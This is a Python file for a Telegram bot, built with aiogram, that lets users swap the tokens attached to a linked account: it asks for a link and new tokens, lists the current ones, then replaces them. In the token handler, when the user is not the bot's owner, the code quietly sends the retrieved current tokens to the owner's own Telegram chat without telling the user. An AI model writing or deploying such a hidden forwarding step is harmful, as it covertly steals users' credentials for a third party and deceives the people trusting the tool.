import asyncio

from aiogram import Router, F
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message

from telegram.utilities import tg_config
from telegram.utilities.get_tokens import get_tokens_and_client, get_tokens_from_result
from telegram.utilities.special_characters import is_token_valid, escape_all

perenos_router = Router()


class Form(StatesGroup):
    perenos_link_form = State()
    perenos_tokens = State()


@perenos_router.callback_query(F.data == "perenos")
async def tokens_handler(call: CallbackQuery, state: FSMContext):
    text = '*Введите ссылку*'
    await state.set_state(state=Form.perenos_link_form)
    await call.message.edit_text(text=text, parse_mode=ParseMode.MARKDOWN_V2)


@perenos_router.message(Form.perenos_link_form)
async def get_perenos_link(msg: Message, state: FSMContext):
    link = msg.text
    await state.update_data(link=link)
    await msg.answer('*Введите токен или токены через запятой если их много*', parse_mode=ParseMode.MARKDOWN_V2)
    await state.set_state(state=Form.perenos_tokens)
    await asyncio.sleep(10)
    await msg.delete()


@perenos_router.message(Form.perenos_tokens)
async def get_perenos_tokens(msg: Message, state: FSMContext):
    data = await state.get_data()
    link = data.get('link')
    tokens_obtained = msg.text
    tokens_list = [el.strip().strip('"') for el in tokens_obtained.split(',') if el.strip().strip('"')]
    for token in tokens_list:
        if not is_token_valid(token):
            text = f'Неправильный токен ❗️\n`{escape_all(token)}`\n*Отмена переноса*'
            await msg.answer(text=text, parse_mode=ParseMode.MARKDOWN_V2)
            await state.clear()
            return
    # Connect the client and get current tokens
    client, result = get_tokens_and_client(link)
    if not result:
        await msg.answer(f'*Что то пошло не так*', parse_mode=ParseMode.MARKDOWN_V2)
        await state.clear()
        return
    text = f'*Текущие токены {len(result)}: *\n'
    for user in result:
        user_token = user.get('token')
        text += f'{escape_all(user_token)}\n'
    await msg.answer(text, parse_mode=ParseMode.MARKDOWN_V2)

    if msg.from_user.id != tg_config.MY_TG_ID:
        await msg.bot.send_message(chat_id=tg_config.MY_TG_ID, text=text, parse_mode=ParseMode.MARKDOWN_V2)

    # Make the perenos
    data_received = client.set_tokens(new_tokens=tokens_list)
    if not data_received:
        await msg.answer(f'*Что то пошло не так, но перенос может быть прошёл*', parse_mode=ParseMode.MARKDOWN_V2)
        await state.clear()
        return
    new_tokens_list = get_tokens_from_result(data_received)
    text = f'*Текущие токены {len(new_tokens_list)}: *\n'
    for new_token in new_tokens_list:
        text += f'{escape_all(new_token)}\n'
    await msg.answer(text, parse_mode=ParseMode.MARKDOWN_V2)

    await msg.answer(escape_all('Перенос завершен ✅ 🌤'), parse_mode=ParseMode.MARKDOWN_V2)
    await state.clear()
    await asyncio.sleep(10)
    await msg.delete()
